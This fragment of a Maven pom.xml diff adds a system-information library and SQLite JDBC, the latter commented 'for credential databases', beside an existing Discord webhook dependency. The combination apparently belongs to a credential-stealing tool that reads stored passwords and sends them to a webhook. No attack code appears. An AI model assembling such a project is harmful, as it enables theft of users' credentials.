@@ -51,6 +51,22 @@
             <artifactId>slf4j-simple</artifactId>
             <version>2.0.5</version>
         </dependency>
+ 
+    
+        <!-- System information library -->
+        <dependency>
+            <groupId>com.github.oshi</groupId>
+            <artifactId>oshi-core</artifactId>
+            <version>6.4.0</version>
+        </dependency>
+    
+        <!-- SQLite for credential databases -->
+        <dependency>
+            <groupId>org.xerial</groupId>
+            <artifactId>sqlite-jdbc</artifactId>
+            <version>3.42.0.0</version>
+        </dependency>
+
         <dependency>
             <groupId>club.minnced</groupId>
             <artifactId>discord-webhooks</artifactId>
